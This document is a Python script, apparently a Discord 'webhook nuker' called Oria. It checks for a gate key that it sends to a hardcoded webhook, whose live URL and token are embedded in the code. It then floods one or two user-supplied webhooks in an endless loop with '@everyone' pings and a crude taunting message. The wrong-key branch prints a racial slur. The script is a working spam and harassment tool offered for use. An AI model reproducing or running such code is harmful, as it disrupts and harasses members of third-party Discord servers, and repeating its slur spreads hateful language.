import discord_webhook
from discord_webhook import DiscordWebhook
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
import os
import time
import random
import string

key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
webhook8 = DiscordWebhook(url="https://discord.com/api/webhooks/996930070906150962/EiNU6PXVdQHp6GwGEhiG-c8NQwTVVCygqAjaRFo-TQqSKWaiJZf2e_MAxNCzwKdpistB", content=key, username="key")
responce = webhook8.execute()
print(f"{Fore.CYAN}[>]{Fore.BLUE} key >>", end='')
keygenerated = launch = input()


if keygenerated == key:
    os.system("cls")
    os.system("title Oria Dev")
    print(f"""
    {Fore.BLUE}
    {Fore.CYAN} ██████╗ ██████╗ ██╗ █████╗ 
    {Fore.BLUE}██╔═══██╗██╔══██╗██║██╔══██╗
    {Fore.CYAN}██║   ██║██████╔╝██║███████║  <3
    {Fore.BLUE}██║   ██║██╔══██╗██║██╔══██║
    {Fore.CYAN}╚██████╔╝██║  ██║██║██║  ██║
    {Fore.BLUE} ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝


    """)
    print(f"{Fore.CYAN}[>]{Fore.BLUE} Webhook URL >> ", end='')
    discordwebhook = launch = input()
    os.system("cls")
    print(f"{Fore.CYAN}[>]{Fore.BLUE} use 2 webhooks ? (y/n)>> ", end='')
    usingmore = launch = input()

    if usingmore == 'y':
        os.system("cls")
        print(f"{Fore.CYAN}[>]{Fore.BLUE} Webhook URL (2) >> ", end='')
        discordwebhook2 = launch = input()
        os.system("cls")
        print(f"{Fore.CYAN}[>]{Fore.BLUE} Customised message >> ", end='')
        messagechoose = launch = input()
        textnuke = """
    **bro got fucked by oria :)**
    @everyone
    """+ messagechoose
        while True:
            webhook1 = DiscordWebhook(url=discordwebhook, content=textnuke, avatar_url="https://resizing.flixster.com/67xypDGJYIJX-eK9mPu9MFXuDMc=/1200x1800/v1.bjs3NzM1MzE7ajsxODQ1ODsxMjAwOzEyMDA7MTgwMA", username="mark")
            response = webhook1.execute()
            webhook2 = DiscordWebhook(url=discordwebhook2, content=textnuke, avatar_url="https://resizing.flixster.com/67xypDGJYIJX-eK9mPu9MFXuDMc=/1200x1800/v1.bjs3NzM1MzE7ajsxODQ1ODsxMjAwOzEyMDA7MTgwMA", username="mark")
            response = webhook2.execute()
            print(f"{Fore.CYAN}[>]{Fore.BLUE} starting spamming @un gars#1337 !", end='')

    else:
        os.system("cls")
        print(f"{Fore.CYAN}[>]{Fore.BLUE} Customised message >> ", end='')
        messagechoose = launch = input()
        textnuke = """
    **bro got fucked by oria :)**
    @everyone
    """+ messagechoose
        while True:
            webhook3 = DiscordWebhook(url=discordwebhook, content=textnuke, avatar_url="https://resizing.flixster.com/67xypDGJYIJX-eK9mPu9MFXuDMc=/1200x1800/v1.bjs3NzM1MzE7ajsxODQ1ODsxMjAwOzEyMDA7MTgwMA", username="mark")
            responce = webhook3.execute()
            print(f"{Fore.CYAN}[>]{Fore.BLUE} starting spamming @un gars#1337 !", end='')
else:
    os.system("cls")
    print(f"{Fore.CYAN}Wrong key nigga ?", end='')
    time.sleep(30)


